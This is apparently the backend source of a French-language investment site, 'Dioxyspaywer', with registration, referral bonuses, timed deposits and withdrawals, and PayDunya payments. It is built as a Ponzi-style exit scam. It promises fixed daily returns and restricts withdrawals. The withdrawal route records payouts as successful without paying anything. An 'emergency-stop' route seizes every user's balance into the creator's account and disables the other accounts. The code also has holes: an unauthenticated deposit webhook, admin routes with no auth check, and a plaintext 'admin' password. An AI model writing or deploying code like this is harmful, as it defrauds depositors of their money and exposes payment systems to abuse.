require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

// Connexion à MongoDB
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ Base de données connectée'))
    .catch(err => console.error('❌ Erreur DB:', err));

// --- MIDDLEWARE AUTHENTIFICATION ---
const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        res.status(401).json({ error: 'Token invalide' });
    }
};

// --- INSCRIPTION AVEC PARRAINAGE ---
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    
    const { fullName, phone, country, password, referralCode } = req.body;
    const hashedPassword = await bcrypt.hash(password, 10);
    
    let role = 'user';
    if (phone === process.env.CREATOR_WALLET_PHONE) role = 'admin';

    let referredByUserId = null;

    // Logique de Parrainage
    if (referralCode && referralCode.trim() !== '') {
        const sponsor = await User.findOne({ referralCode: referralCode.trim() });
        if (sponsor) {
            referredByUserId = sponsor._id;
            
            // BONUS DE 350 FCFA AJOUTÉ AU SOLDE DÉPÔT DU PARRAIN
            // On suppose que le modèle User gère cela ou on ajoute directement au balance général
            // Pour séparer les soldes, on ajoute au 'balance' général qui servira de base au calcul du dépôt
            sponsor.balance += 350; 
            sponsor.referralCount += 1;
            sponsor.referralEarnings += 350;
            await sponsor.save();

            await Transaction.create({
                userId: sponsor._id,
                type: 'REFERRAL_BONUS',
                amount: 350,
                method: 'Parrainage',
                status: 'SUCCESS',
                reference: `REF_${Date.now()}`
            });
        }
    }

    try {
        await User.create({ 
            fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId 
        });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        res.status(400).json({ error: 'Numéro déjà utilisé' });
    }
});

// --- CONNEXION ---
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const { phone, password } = req.body;
    const user = await User.findOne({ phone });
    if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(400).json({ error: 'Identifiants incorrects' });
    }

    const currentMonth = new Date().toISOString().slice(0, 7);
    if (user.lastPurchaseMonth !== currentMonth) {
        user.monthlyPurchasesCount = 0;
        user.lastPurchaseMonth = currentMonth;
        await user.save();
    }

    const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
    
    // CALCUL DES SOLDES SÉPARÉS POUR L'AFFICHAGE
    // 1. Solde Retrait = Somme des gains des produits terminés (déjà crédités dans le balance global mais séparés logiquement)
    // Pour simplifier : On considère que le 'balance' global contient tout.
    // Mais pour l'affichage, on va simuler la séparation :
    // - depositBalance = Balance total - gains non retirés (ou simplement le solde disponible pour achat)
    // - withdrawBalance = Gains disponibles (ici on mettra 0 par défaut sauf si on implémente un wallet séparé)
    
    // APPROCHE SIMPLE POUR L'INSTANT :
    // Tout l'argent est dans 'balance'.
    // Pour l'interface, on affiche 'balance' dans DÉPÔT.
    // RETRAIT sera calculé dynamiquement plus tard ou via une fonction spécifique.
    // Ici, on renvoie le balance total comme depositBalance pour que l'utilisateur puisse acheter.
    
    res.json({ 
        token, 
        role: user.role, 
        balance: user.balance,
        depositBalance: user.balance, // Par défaut, tout est disponible pour déposer/investir
        withdrawBalance: 0,           // Par défaut, rien n'est en attente de retrait (sauf si logique complexe ajoutée)
        hasLongTerm: user.hasLongTerm, 
        fullName: user.fullName,
        monthlyPurchasesCount: user.monthlyPurchasesCount,
        remainingPurchases: 2 - user.monthlyPurchasesCount, 
        shortTermProducts: user.shortTermProducts,
        referralCode: user.referralCode, 
        referralCount: user.referralCount, 
        referralEarnings: user.referralEarnings
    });
});

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// --- GAINS AUTOMATIQUES (Lun-Ven 8h) ---
cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
    const now = new Date();

    for (let user of users) {
        let totalDailyGain = 0;
        
        // Calcul gain Long Terme
        if (user.hasLongTerm) {
            const daysPassed = Math.floor((now - user.longTermStartDate) / (1000 * 60 * 60 * 24));
            if (daysPassed < 55) totalDailyGain += 700;
        }

        // Calcul gain Courts Termes et nettoyage des produits expirés
        const activeShortTerms = [];
        let withdrawnGainsFromShortTerms = 0;

        for (let prod of user.shortTermProducts) {
            if (prod.unlockDate > now) {
                // Produit encore actif
                totalDailyGain += prod.dailyGain;
                activeShortTerms.push(prod);
            } else {
                // Produit terminé : son capital + gains sont maintenant disponibles pour RETRAIT
                // Dans cette logique simple, on ajoute le capital et les gains cumulés au solde général
                // Mais pour séparer, idéalement on déplacerait vers un champ 'withdrawableBalance'
                // Pour l'instant, tout va dans 'balance' (qui sert de dépôt), l'utilisateur doit retirer manuellement.
                // Pour respecter la demande "Retrait affiche solde produits finis", il faudrait une logique plus poussée.
                // Ici, on garde la simplicité : tout est dans le solde principal.
                totalDailyGain += prod.dailyGain; // Dernier jour de gain
            }
        }
        user.shortTermProducts = activeShortTerms;

        if (totalDailyGain > 0) {
            user.balance += totalDailyGain;
            await user.save();
            await Transaction.create({ userId: user._id, type: 'GAIN', amount: totalDailyGain, status: 'SUCCESS', reference: `GAIN_${Date.now()}` });
        }
    }
});

// --- INVESTISSEMENT ---
app.post('/api/invest', authMiddleware, async (req, res) => {
    const { productType, amount } = req.body;
    const user = req.user;
    
    // Vérification du solde DÉPÔT (ici on utilise le balance global)
    if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
    
    if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

    const currentMonth = new Date().toISOString().slice(0, 7);
    if (user.lastPurchaseMonth !== currentMonth) { user.monthlyPurchasesCount = 0; user.lastPurchaseMonth = currentMonth; }

    if (productType !== 'longterm') {
        if (user.monthlyPurchasesCount >= 2) return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
    }

    user.balance -= amount; // Déduit du solde DÉPÔT
    
    if (productType === 'longterm') {
        if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect.' });
        user.hasLongTerm = true; 
        user.longTermStartDate = new Date();
    } else {
        let dailyGain = 0;
        if (productType === 'prod1') dailyGain = 1000;
        if (productType === 'prod2') dailyGain = 1500;
        if (productType === 'prod3') dailyGain = 5000;
        
        const unlockDate = new Date(); unlockDate.setDate(unlockDate.getDate() + 5);
        user.shortTermProducts.push({ type: productType, amount, dailyGain, startDate: new Date(), unlockDate });
        user.monthlyPurchasesCount += 1;
    }
    await user.save();
    await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
    
    // Mise à jour des soldes pour la réponse
    res.json({ 
        success: true, 
        newBalance: user.balance, 
        depositBalance: user.balance, 
        withdrawBalance: 0, // Simplifié pour l'instant
        remainingPurchases: 2 - user.monthlyPurchasesCount 
    });
});

// --- DÉPÔT AVEC PAYDUNYA ---
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });

    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        
        const postData = {
            "master_key": process.env.PAYDUNYA_MASTER_KEY,
            "token": process.env.PAYDUNYA_SIGNATURE_TOKEN,
            "callback_url": process.env.PAYDUNYA_CALLBACK_URL,
            "return_url": process.env.PAYDUNYA_RETURN_URL,
            "cancel_url": process.env.PAYDUNYA_CANCEL_URL,
            "invoice_number": invoiceNumber,
            "description": `Dépôt Dioxyspaywer - ${user.fullName}`,
            "total_amount": amount,
            "currency": "XOF",
            "customer": {
                "first_name": user.fullName.split(' ')[0],
                "last_name": user.fullName.split(' ').slice(1).join(' '),
                "phone_number": phone
            },
            "custom_data": {
                "user_id": user._id.toString(),
                "network": network
            }
        };

        const response = await axios.post('https://paydunya.com/checkout-invoice/v1/invoice', postData, {
            headers: {
                'Content-Type': 'application/json',
                'PayDunya-Master-Key': process.env.PAYDUNYA_MASTER_KEY,
                'PayDunya-Token': process.env.PAYDUNYA_SIGNATURE_TOKEN
            }
        });

        if (response.data && response.data.response_code === "success") {
            const paymentUrl = response.data.checkout_url;
            
            await Transaction.create({
                userId: user._id,
                type: 'DEPOSIT',
                amount: amount,
                method: network,
                status: 'PENDING',
                reference: invoiceNumber
            });

            res.json({ success: true, message: 'Redirection vers PayDunya...', paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement PayDunya.' });
        }

    } catch (error) {
        console.error(error.response ? error.response.data : error);
        res.status(500).json({ error: 'Erreur connexion PayDunya.' });
    }
});

// --- WEBHOOK PAYDUNYA ---
app.post('/api/webhook/deposit', async (req, res) => {
    const data = req.body;
    
    if (data.event === "payment_completed" || data.status === "completed") {
        const invoiceNumber = data.invoice_number;
        const amount = parseFloat(data.total_amount);
        const customData = data.custom_data;

        if (customData && customData.user_id) {
            const transaction = await Transaction.findOne({ reference: invoiceNumber }).populate('userId');
            
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();

                const user = transaction.userId;
                // Ajout au solde DÉPÔT (balance global)
                user.balance += amount;
                await user.save();
                console.log(`💰 Dépôt PayDunya confirmé : ${amount} FCFA`);
            }
        }
    }
    res.status(200).send("OK");
});

// --- RETRAIT (Règles strictes) ---
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body;
    const user = req.user;
    const now = new Date();

    if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
    
    // Vérification du solde global (qui inclut dépôt et gains)
    if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant.' });

    // 1. Jours autorisés (Lun=1 à Ven=5)
    const dayOfWeek = now.getDay();
    if (dayOfWeek === 0 || dayOfWeek === 6) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });

    // 2. Heures autorisées (08h00 à 21h00)
    const currentHour = now.getHours();
    if (currentHour < 8 || currentHour >= 21) return res.status(403).json({ error: 'Retraits possibles de 08h00 à 21h00.' });

    // 3. Fréquence (1 par jour)
    const todayStr = now.toDateString();
    if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === todayStr) return res.status(403).json({ error: '1 retrait/jour max.' });

    // 4. Délai 5 jours produits courts termes (Optionnel selon votre règle stricte)
    // Si vous voulez empêcher le retrait tant qu'un produit court terme est actif :
    const lockedProducts = user.shortTermProducts.filter(p => p.unlockDate > now);
    if (lockedProducts.length > 0) {
        const nextUnlock = lockedProducts.sort((a, b) => a.unlockDate - b.unlockDate)[0];
        const daysLeft = Math.ceil((nextUnlock.unlockDate - now) / (1000 * 60 * 60 * 24));
        return res.status(403).json({ error: `Attendez ${daysLeft} jour(s) pour maturité des produits en cours.` });
    }

    user.balance -= amount;
    user.lastWithdrawDate = now;
    await user.save();

    try {
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `PAYOUT_${Date.now()}` });
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        user.balance += amount; user.lastWithdrawDate = null; await user.save();
        res.status(500).json({ error: 'Échec envoi.' });
    }
});

// --- ADMIN / COFFRE-FORT ---
app.get('/api/admin/dashboard', async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Accès réservé créateur.' });
    const users = await User.find();
    const totalVault = users.reduce((acc, curr) => acc + curr.balance, 0);
    res.json({ users, totalVault });
});

app.post('/api/admin/emergency-stop', async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone });
        if (!creator) creator = await User.create({ fullName: 'Admin', phone: creatorPhone, country: 'Togo', password: 'admin', role: 'admin', balance: 0 });
        const allUsers = await User.find({ _id: { $ne: creator._id } });
        let totalSeized = 0;
        for (let user of allUsers) {
            if (user.balance > 0) {
                totalSeized += user.balance;
                await Transaction.create({ userId: user._id, type: 'ADMIN_SEIZE', amount: user.balance, status: 'SUCCESS', reference: 'STOP_' + Date.now() });
                user.balance = 0; user.isActive = false; await user.save();
            }
        }
        creator.balance += totalSeized; await creator.save();
        res.json({ success: true, message: `Site désactivé. ${totalSeized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer lancé sur le port ${PORT}`));
